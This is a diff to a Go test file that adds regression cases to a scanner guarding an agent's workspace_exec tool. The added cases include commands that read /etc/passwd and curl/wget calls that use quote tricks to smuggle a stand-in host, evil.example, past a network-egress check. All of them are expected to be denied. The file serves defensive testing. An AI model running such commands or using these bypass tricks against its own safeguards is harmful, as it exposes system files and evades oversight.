@@ -118,6 +118,46 @@ func TestScannerBypassRegressions(t *testing.T) {
 			decision: DecisionDeny, rule: ruleNetworkEgress,
 		},
 		{
+			name: "local file url denied path",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "curl file:///etc/passwd",
+			},
+			decision: DecisionDeny, rule: ruleSensitivePath,
+		},
+		{
+			name: "local file url allowed path",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "curl file:///tmp/report",
+			},
+			decision: DecisionAllow,
+		},
+		{
+			name: "parsed curl url operand denied",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "curl https://github.com'.evil.example'/x",
+			},
+			decision: DecisionDeny, rule: ruleNetworkEgress,
+		},
+		{
+			name: "parsed wget url operand denied",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "wget --header X https://github.com'.evil.example'/x",
+			},
+			decision: DecisionDeny, rule: ruleNetworkEgress,
+		},
+		{
+			name: "parsed curl url option denied",
+			req: Request{
+				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
+				Command: "curl --url=https://github.com'.evil.example'/x",
+			},
+			decision: DecisionDeny, rule: ruleNetworkEgress,
+		},
+		{
 			name: "curl config needs review",
 			req: Request{
 				ToolName: "workspace_exec", Backend: BackendWorkspaceExec,
